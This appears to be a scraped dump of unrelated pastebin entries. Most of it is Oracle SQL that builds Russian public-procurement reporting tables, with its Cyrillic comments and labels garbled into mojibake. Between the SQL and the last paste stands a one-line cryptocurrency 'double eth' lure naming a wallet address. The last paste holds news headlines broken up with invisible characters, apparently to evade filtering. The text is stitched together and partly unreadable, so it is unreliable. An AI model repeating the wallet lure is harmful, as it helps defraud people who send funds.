             When con.placing In ('11013') Then '–û—Ç–∫—Ä—ã—Ç—ã–π –∫–æ–Ω–∫—É—Ä—Å –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('11031','11033') Then '–î–≤—É—Ö—ç—Ç–∞–ø–Ω—ã–π –∫–æ–Ω–∫—É—Ä—Å –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('13011') Then '–ó–∞–ø—Ä–æ—Å –∫–æ—Ç–∏—Ä–æ–≤–æ–∫'
             When con.placing In ('11023') Then '–ö–æ–Ω–∫—É—Ä—Å —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º —É—á–∞—Å—Ç–∏–µ–º –≤ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ'
             When con.placing In ('30000') Then '–°–ø–æ—Å–æ–± –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞ (–ø–æ–¥—Ä—è–¥—á–∏–∫–∞, –∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª—è),  —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø—Ä–∞–≤–∏—Ç–µ–ª—å—Å—Ç–≤–æ–º —Ä–æ—Å—Å–∏–π—Å–∫–æ–π —Ñ–µ–¥–µ—Ä–∞—Ü–∏–∏ –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å–æ —Å—Ç–∞—Ç—å–µ–π 111 —Ñ–µ–¥–µ—Ä–∞–ª—å–Ω–æ–≥–æ –∑–∞–∫–æ–Ω–∞'
             When con.placing In ('14011') Then '–ó–∞–ø—Ä–æ—Å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–π'
             When con.placing In ('11011') Then '–û—Ç–∫—Ä—ã—Ç—ã–π –∫–æ–Ω–∫—É—Ä—Å'
             When con.placing In ('11042') Then '–ó–∞–∫—Ä—ã—Ç—ã–π –∫–æ–Ω–∫—É—Ä—Å'
             When con.placing In ('11021') Then '–ö–æ–Ω–∫—É—Ä—Å —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º —É—á–∞—Å—Ç–∏–µ–º'
             When con.placing In ('12022') Then '–ó–∞–∫—Ä—ã—Ç—ã–π –∞—É–∫—Ü–∏–æ–Ω'
             Else Null
        End sop_name,
        rs.name,
        Case 
            When lower(con.contractstage) = 'e' Then '–ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ'
            When lower(con.contractstage) = 'et' Then '–ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–µ–∫—Ä–∞—â–µ–Ω–æ'
            When lower(con.contractstage) = 'ec' Then '–ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ'
            When lower(con.contractstage) = 'in' Then '–ê–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–Ω–æ'
		Else Null End stage,
        con.startdate,
        con.enddate, --–ü–ª–∞–Ω–æ–≤–∞—è –¥–∞—Ç–∞ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
        con.rejectiondate, --–¥–∞—Ç–∞ —Ä–∞—Å—Ç–æ—Ä–∂–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
        to_number(2024) finyear, --–≥–æ–¥ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
        con.targetexpenseitemcode, --—Ü–µ–ª–µ–≤–∞—è —Å—Ç–∞—Ç—å—è
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and con.kvr not in ('244') then '–î–∞' else '–ù–µ—Ç'    
        end priznak,--–ü—Ä–∏–∑–Ω–∞–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç–∞—Ç—å–∏ (–ê–ò–ü)
        -- Case When con.exec_startyear=2022 Then exec_stageprice ELse null End fact,
        null fact,
        null lotid,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        con.contractsubject,
        con.supplier_inn,
        con.supplier_fullname,
        con.supplierkpp,
        org.contragent_account, --–∫–æ–¥ –∑–∞–∫–∞–∑—á–∏–∫–∞
        null contractactualpaid, --—Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –æ–ø–ª–∞—á–µ–Ω–æ –≤—Å–µ–≥–æ
        null fulfilment_sum,
        null date_notice_published,
        null price_type,
        con.suppliertype,
        con.rtc_price,
        con.supply_impossible

From con
join dwh_organization_kgntv org On con.responsibleorg_fullname=org.full_name and con.rn=1 --—É–±—Ä–∞–ª –ø—Ä–∞–≤–∏–ª–æ –∏–∑ –±–ª–æ–∫–∞ con –Ω–µ –ø–æ–ø–∞–¥–∞–ª–∏ –Ω—É–∂–Ω—ã–µ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—ã –ø—Ä–∏–º–µ—Ä 2782536397817000116
Left join proc On con.notificationnumber=proc.purchasenumber
Left Join contract_single_supp_reasons rs On rs.code_oos = con.singlecustomer And rs.actual = 1
Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=con.targetexpenseitemcode
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
left join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left join (
            Select positionnumber, purchasecode, tenderplan 
            from (
                    select row_number() over (PARTITION BY positionnumber, docpublishdate order by positionnumber) rn, t.*       
                    from dwh_start_notice_nrpz t
                    where (t.positionnumber, t.docpublishdate) in ( Select positionnumber, max(docpublishdate)docpublishdate from dwh_start_notice_nrpz group by positionnumber) 
                 )
             where rn =1
          ) notice On notice.positionnumber= Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
Where org.id<>1610 --16.11.2021 –ü–∏—Å—å–º–æ –ö—Ä–∏—Ü–∫–æ–π –õ.–ê.          
;"
rpQ9Fshk,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:12 AM CDT,"truncate table dwh_detailing_zak_general_2024;
insert into dwh_detailing_zak_general_2024
With 
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1     
         ),
con As (
            Select distinct notificationnumber
            From dwh_contracts_delegated c
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
        )   
Select Case When pro.orgid='141053' Then '146504' Else pro.orgid End orgid, --–≤ —Å–≤—è–∑–∏ —Å —Ç–µ–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–π —Å–∞–¥–∏–∫ —Ä–µ–æ—Ä–≥–∞–Ω–∑–∏–≤–∞–ª—Å—è –≤ —Å–∞–¥–∏–∫ —Å –ò–ù–ù=7820076257 –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å—É–º–º–∏—Ä–æ–≤–∞—Ç—å
       pro.ORGTITLE, org.short_name, 
       Case WHen org.inn='7820075581' Then '7820076257' Else org.inn End inn, --–≤ —Å–≤—è–∑–∏ —Å —Ç–µ–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–π —Å–∞–¥–∏–∫ —Ä–µ–æ—Ä–≥–∞–Ω–∑–∏–≤–∞–ª—Å—è –≤ —Å–∞–¥–∏–∫ —Å –ò–ù–ù=7820076257 –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å—É–º–º–∏—Ä–æ–≤–∞—Ç—å
       org.kpp,  pro.GRBSTITLE, org.grbs_inn, pro.grbsid, vg.vg_name vg,
       pro.pg_ikz,  pro.pg_n, pro.pg_rn, pro.ikz, --–ò–ö–ó –∏–∑ –∏–∑–≤–µ—â–µ–Ω–∏—è
       pro.reqnum,  coalesce(pro.DATE_DEMAND_START,pro.first_notice_try) first_notice_try, --  –î–∞—Ç–∞ –ø–µ—Ä–≤–æ–π —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è (xml-–ø–∞–∫–µ—Ç–∞)–≤ –ï–ò–° ( –ù–ï –í–°–ï–ì–î–ê = –î–∞—Ç–µ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è)  
       case when pro.joflag=1 then 1 else 0 end sovm,
       cons.orgtitle c_org,
       case when pro.placement='–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –∑–∞–∫—É–ø–∫–∞' then 1 else 0 end centr,
       fin.flag_pp, --–≤ —Ä–∞–º–∫–∞—Ö —á.6–ø.15 (–ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–æ–ª–Ω–æ–º–æ—á–∏—è)      
       pro.orgtitle org_pp, --–æ—Ä–≥–∞–Ω–∏–∑–∞—Ü, –æ—Å—É—â–µ—Å—Ç–≤–ª—è—é—â–∞—è –ø–æ–ª–Ω–æ–º–æ—á–∏—è –∑–∞–∫–∞–∑—á–∏–∫–∞ 
       Case When (pro.sed_reg_number Is Not Null or pro.request_order_number Is Not Null) Then 1 Else 0 End UOPLACING, 
       uo_org.FULL_NAME uo_org,
       fin.LOTUUID, 
       fin.finyear, -- –≥–æ–¥ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
       fin.TARGETEXPENSEITEMCODE, 
       t.NP_CODE_NAME,t.FP_CODE_NAME,
       case when fin.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and fin.expensetypecode not in '244'  
       or (fin.targetexpenseitemcode in ('022E15305F','021E15305F') and fin.expensetypecode='414' and fin.kosgucode='310' and pro.orgid='1506') -- –ø—Ä–∞–≤–∏–ª–æ –ø–æ –ø–∏—Å—å–º—É –∫—Ä–∏—Ü–∫–æ–π –æ—Ç 5.10.222       
            Then '–î–∞' else '–ù–µ—Ç'     
        end priznak,--–ü—Ä–∏–∑–Ω–∞–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç–∞—Ç—å–∏ (–ê–ò–ü)
       pro.F_PRODUCTPRICE, fin.FINSUM, fin.budget_type, fin.expensetypecode, fin.kosgucode,fin.fundcode,
       pro.REQUESTID,
       pro.LOTSTAGE,
       pro.FORDERTYPENAME, pro.ONEEXEC,pro.SUBJECT, org.CONTRAGENT_ACCOUNT,
       pro.date_notice_published-- –î–∞—Ç–∞ —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –ø–µ—Ä–≤–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è –Ω–∞ –ï–ò–°    
From FIN_TARG_ZAK_2024_table fin -- 28.09.22 —Å–æ–∑–¥–∞–Ω–∞ —Ç–∞–±–ª–∏—Ü–∞ —Å –∏–Ω—Ñ-—Ü–∏–µ–π –ø–æ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—é –∑–∞–∫—É–ø–æ–∫(—Å 3-–º—è union)
  Join dwh_procedures_kgntv pro on nvl(pro.lot_cons_m,pro.lotuuid)=fin.lotuuid 
                                   And(( ((pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M') or pro.lot_cons_m Is Null) -- –±–µ—Ä–µ–º —Ç–æ–ª—å–∫–æ –º–∞—Ç—å pro.lot_cons_m=pro.lotuuid and pro.mord_flag='M'
                                   And pro.reqnum Not In (Select reqnum From wrong_purchase)
								   And pro.reqnum Is Not Null
								   And ( pro.final_decision <>'–û—Ç–º–µ–Ω–∞ –∑–∞–∫—É–ø–∫–∏' or pro.final_decision is null) 
								   And pro.lotstageid not in (93,100,146,61) -- 93 –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞, 
  																	      -- 100 - –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç 27.09.2019 –∫–æ—Ä—Ä–µ–∫—Ç–∏—Ä–æ–≤–∫–∞ –Ø–∫–æ–≤–ª–µ–≤–∞ –ê.–ò. (–Ω–µ —É—á–∏—Ç—ã–≤–∞—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞–∫—É–ø–∫–∞ –Ω–µ —Å–æ—Å—Ç–æ—è–ª–∞—Å—å)
																		  -- 146 –ó–∞–∫—É–ø–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –æ—Ç 03.12.2021 –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 
																		  -- 61 –ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
								   And pro.orgid in (Select id From dwh_organization_not_zak ) --–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É–±—Ä–∞—Ç—å —É—á—Ä–µ–∂–¥–µ–Ω–∏—è –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å–Ω–æ–π –≤–ª–∞—Å—Ç–∏  
								   And pro.orgid<>1610 --16.11.2021 –ü–∏—Å—å–º–æ –ö—Ä–∏—Ü–∫–æ–π –õ.–ê.)
								   )or pro.lotuuid=4996697 -- –í—ã–∫–ª—é—á–∏—Ç—å –∑–∞–∫—É–ø–∫—É –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –≤ —Å—Ç–∞–¥–∏—é –ø–æ –∑–∞–∫–ª—é—á–µ–Ω–∏—é –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
                                   ) 
  Join dwh_organization_kgntv   org on org.id=pro.orgid 
  Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=fin.targetexpenseitemcode
  Left Join dwh_contract_kgntv con on fin.lotuuid=con.lotid 
  Left Join dwh_organization_kgntv uo_org on uo_org.id = pro.uo_orgid  
  Left Join dwh_procedures_cons_kgntv cons on cons.lotuuid = pro.Joint_procedure_id
  Left Join dwh_vg_22 vg on vg.grbs_id = pro.grbsid
  Left Join (
                Select distinct purchasenumber 
                From dwh_protocol_nrpz_acgz  	
                where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
            ) prot On prot.purchasenumber=pro.reqnum 
  Left Join ( 
                Select distinct purchasenumber
                From dwh_start_notice_canc_acgz
            ) canc on canc.purchasenumber=pro.reqnum
  Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=pro.reqnum           
  where   con.CONTRACTRNK is null 
        And prot.purchasenumber is null -- –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 19.04.2021 –£–±—Ä–∞—Ç—å –∑–∞–∫—É–ø–∫–∏, –≤ –∫–æ—Ç–æ—Ä—ã—Ö –µ—Å—Ç—å ""—É–∫–ª–æ–Ω–µ–Ω–∏–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –∏–ª–∏ –æ—Ç–∫–∞–∑ –∑–∞–∫–∞–∑—á–∏–∫–∞ –æ—Ç –∑–∞–∫–ª—é—á–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞""
        And canc.purchasenumber is null -- –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 19.04.2021 –£–±—Ä–∞—Ç—å –∑–∞–∫—É–ø–∫–∏, —É –∫–æ—Ç–æ—Ä—ã—Ö –µ—Å—Ç—å –ø—Ä–æ—Ç–æ–∫–æ–ª –∏–∑–≤–µ—â–µ–Ω–∏—è –æ–± –æ—Ç–º–µ–Ω–µ        
        And pro.reqnum not in ( 
                                Select distinct reqnum 
                                From dwh_procedures_kgntv pro
                                Join dwh_contract_kgntv con On con.lotid=pro.lotuuid
                                Where pro.reqnum Is Not Null
                              ) -- –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 19.04.2021 –£–±—Ä–∞—Ç—å —Å–æ–≤–º–µ—Å—Ç–Ω—ã–µ –∑–∞–∫—É–ø–∫–∏, –µ—Å–ª–∏ –ø–æ –∏–∑–≤–µ—â–µ–Ω–∏—é –µ—Å—Ç—å —Ö–æ—Ç—å –æ–¥–∏–Ω –∫–æ–Ω—Ç—Ä–∞–∫—Ç
        And case when pro.lotstage='–ó–∞–∫—É–ø–∫–∞ –Ω–µ —Å–æ—Å—Ç–æ—è–ª–∞—Å—å (–ø—Ä–æ–¥–ª–µ–Ω–∏–µ —Å—Ä–æ–∫–æ–≤ –ø–æ–¥–∞—á–∏ –∑–∞—è–≤–æ–∫)' And notice.purchasenumber is null then 1 else 0 end = 0 --–ö—Ä–∏—Ü–∫–∞—è –õ.–ê. –ø–∏—Å—å–º–æ –æ—Ç 24.06.2021 
		
union all

Select  to_char(org.id) orgid, proc.responsibleorg_fullname,org.short_name, org.inn, org.kpp, 
        org.grbs_full_name, org.grbs_inn, to_char(org.parentid) grbsid, vg.vg_name vg,
        pos.pg_ikz pg_ikz, proc.plannumber,proc.positionnumber, proc.purchasecode, proc.purchasenumber,
        null first_notice_try,
        0 As sovm,
        null As c_org,
        0 As centr,
        1 flag_pp,
        proc.responsibleorg_fullname org_pp,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        null lotuuid,
        2024 finyear, --–≥–æ–¥ —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
        proc.targetexpenseitemcode,
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip ) and to_number(proc.kvr) not in (244) then '–î–∞' else '–ù–µ—Ç'              
        end priznak,--–ü—Ä–∏–∑–Ω–∞–∫ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç–∞—Ç—å–∏ (–ê–ò–ü)
        proc.maxprice,
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum,
        null budjet_type,--—Ç–∏–ø —Ñ–∏–Ω–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–∏—è
        to_number(proc.kvr) kvr,
        null kosgu,--–ö–û–°–ì–£
		null fundcode, -- –ö–æ–¥ —Ñ–æ–Ω–¥–∞
        null requestid,
        null status,
        proc.placingway_name,
        null onex,
        purchaseobjectinfo
        , org.CONTRAGENT_ACCOUNT,    
        null date_notice_published
From proc 
Left Join con On proc.purchasenumber=con.notificationnumber
Left Join dwh_organization_kgntv org on proc.responsibleorg_fullname=org.full_name
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=proc.positionnumber
Left Join dwh_targetexpenseitemcode_2020 t On t.targetexpenseitemcode=proc.targetexpenseitemcode
Left Join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left Join (
            Select distinct purchasenumber 
            From dwh_protocol_nrpz_acgz  	
            where TYPE in('fcsProtocolDeviation', 'fcsProtocolEvasion', 'epProtocolEvasion', 'epProtocolDeviation') 
        ) prot On prot.purchasenumber=proc.purchasenumber 
Left Join ( 
            Select distinct purchasenumber
            From dwh_start_notice_canc_acgz
        ) canc on canc.purchasenumber=proc.purchasenumber
Left Join (Select distinct purchasenumber From dwh_notice_prolong_nrpz) notice on notice.purchasenumber=proc.purchasenumber 
Left Join (Select distinct reqnum From dwh_procedures_kgntv) p On p.reqnum=proc.purchasenumber
Where proc.purchasenumber Is Not Null And con.notificationnumber is null
And Case
            When currentyear is null Then 0
            When 2024 = currentyear And finsum_currentyear<>0 then 1 
            When 2024-1 = currentyear And finsum_firstyear <>0 then 1 
            When 2024-2 = currentyear And finsum_secondyear<>0 then 1 
            ELse 0
    end =1
And prot.purchasenumber is null -- –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 19.04.2021 –£–±—Ä–∞—Ç—å –∑–∞–∫—É–ø–∫–∏, –≤ –∫–æ—Ç–æ—Ä—ã—Ö –µ—Å—Ç—å ""—É–∫–ª–æ–Ω–µ–Ω–∏–µ —É—á–∞—Å—Ç–Ω–∏–∫–∞ –∏–ª–∏ –æ—Ç–∫–∞–∑ –∑–∞–∫–∞–∑—á–∏–∫–∞ –æ—Ç –∑–∞–∫–ª—é—á–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞""
And canc.purchasenumber is null -- –ö—Ä–∏—Ü–∫–∞—è –õ.–ê. 19.04.2021 –£–±—Ä–∞—Ç—å –∑–∞–∫—É–ø–∫–∏, —É –∫–æ—Ç–æ—Ä—ã—Ö –µ—Å—Ç—å –ø—Ä–æ—Ç–æ–∫–æ–ª –∏–∑–≤–µ—â–µ–Ω–∏—è –æ–± –æ—Ç–º–µ–Ω–µ    
And p.reqnum is null --–ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É–±—Ä–∞—Ç—å —Ç–µ –∏–∑–≤–µ—â–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ —É–∂–µ –µ—Å—Ç—å –≤ –ê–ò–°–ì–ó
And proc.responsibleorg_fullname<>'–§–ï–î–ï–†–ê–õ–¨–ù–û–ï –ì–û–°–£–î–ê–†–°–¢–í–ï–ù–ù–û–ï –ë–Æ–î–ñ–ï–¢–ù–û–ï –£–ß–†–ï–ñ–î–ï–ù–ò–ï –ö–£–õ–¨–¢–£–†–´ ""–ì–û–°–£–î–ê–†–°–¢–í–ï–ù–ù–´–ô –ú–£–ó–ï–ô-–ó–ê–ü–û–í–ï–î–ù–ò–ö ""–ü–ê–í–õ–û–í–°–ö""'
And proc.purchasenumber not in (Select reqnum From wrong_purchase);

-- –£–¥–∞–ª—è–µ–º –∑–∞–∫—É–ø–∫–∏ —É –∫–æ—Ç–æ—Ä—ã—Ö –Ω–µ—Ç –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ –ø–æ–¥–≤–µ–¥–µ–Ω–∏—è –∏—Ç–æ–≥–æ–≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞ –∏ –ø—Ä–æ—à–ª–æ –±–æ–ª–µ–µ 50 —Ä–∞–±–æ—á–∏—Ö –¥–Ω–µ–π —Å –º–æ–º–µ–Ω—Ç–∞ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ –ø–µ—Ä–≤–æ–π –≤–µ—Ä—Å–∏–∏ –∏–∑–≤–µ—â–µ–Ω–∏—è
DELETE FROM dwh_detailing_zak_general_2024
WHERE reqnum in 
(SELECT reqnum FROM dwh_detailing_zak_general_2024 z
  LEFT JOIN (
      SELECT purchasenumber, 
             type, 
            max(protocoldate) protocolopr ,
            protocolnumber
        FROM dwh_protocol_nrpz_acgz
       WHERE type in (
                        'epProtocolEOK3',
                        'epProtocolEZK2020Final',
                        'epProtocolEOKOU3',
                        'epProtocolEOK2020Final',
                        'fcsProtocolEF3',
                        'epProtocolEF2020Final',
                        'epProtocolEZT2020FinalPart')
       GROUP BY purchasenumber, type, protocolnumber) prot on z.reqnum = prot.purchasenumber
       Left Join (
	Select Distinct
		protocolnumber,
		purchasenumber,
        protocoldate
	From dwh_protocol_nrpz_acgz
	Where type In ('ProtocolCancel','fcsProtocolCancel','epProtocolCancel') 
		  ) canc On canc.protocolnumber = prot.protocolnumber And canc.purchasenumber = prot.purchasenumber And prot.protocolopr < canc.protocoldate
WHERE (case when sysdate > (SELECT min(t.date_)
                              FROM work_Days_of_2019 t 
                              JOIN work_Days_of_2019 t1 on (t.date_>t1.date_ and t.nm=t1.nm+50)
                             WHERE t1.date_ >= (SELECT min(date_)
                                                  FROM work_Days_all
                                                 WHERE DATE_ >= (trunc(z.first_notice_try)) and type=1)) and (/*protocolopr is null or*/ canc.protocolnumber is /*not*/ null) then 1 else 0 end ) = 1)"
5RVKpQ3r,wallet,BrainRTP,Lua,Tuesday 23rd of April 2024 09:03:57 AM CDT,"double eth

send to 0x650e6888511805f92E7A9A833E354da3D7D24766"
Fe6pGZCb,News April23 24,Newscaster_Ned,Email,Tuesday 23rd of April 2024 08:48:26 AM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé

T‚Äéi‚Äém‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äén‚Äé ‚Äéu‚Äép‚Äéd‚Äéa‚Äét‚Äée‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéo‚Äén‚Äék‚Äée‚Äéy‚Äés‚Äé.‚Äé

D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéG‚Äéa‚Äég‚Äég‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚ÄéW‚Äéi‚Äét‚Äén‚Äée‚Äés‚Äés‚Äé ‚ÄéM‚Äéi‚Äéc‚Äéh‚Äéa‚Äée‚Äél‚Äé ‚ÄéC‚Äéo‚Äéh‚Äée‚Äén‚Äé ‚ÄéC‚Äéa‚Äél‚Äél‚Äés‚Äé ‚ÄéH‚Äéi‚Äém‚Äé ‚Äé'‚ÄéV‚Äéo‚Äén‚Äé ‚ÄéS‚Äéh‚Äéi‚Äét‚Äéz‚ÄéI‚Äén‚ÄéP‚Äéa‚Äén‚Äét‚Äéz‚Äé'‚Äé
O‚Äéu‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé ‚ÄéB‚Äéi‚Äés‚Äéh‚Äéo‚Äép‚Äé ‚ÄéD‚Äée‚Äén‚Äéo‚Äéu‚Äén‚Äéc‚Äée‚Äés‚Äé ‚Äé‚Äò‚ÄéS‚Äéi‚Äél‚Äée‚Äén‚Äét‚Äé ‚ÄéS‚Äéh‚Äée‚Äép‚Äéh‚Äée‚Äér‚Äéd‚Äés‚Äé,‚Äé‚Äô‚Äé ‚Äé‚Äò‚ÄéC‚Äéo‚Äér‚Äér‚Äéu‚Äép‚Äét‚Äé ‚ÄéV‚Äéa‚Äét‚Äéi‚Äéc‚Äéa‚Äén‚Äé‚Äô‚Äé
S‚Äéw‚Äée‚Äéd‚Äée‚Äén‚Äé ‚ÄéS‚Äée‚Äéi‚Äéz‚Äée‚Äés‚Äé ‚Äé1‚Äé.‚Äé4‚Äé ‚ÄéT‚Äéo‚Äén‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéC‚Äéo‚Äéc‚Äéa‚Äéi‚Äén‚Äée‚Äé
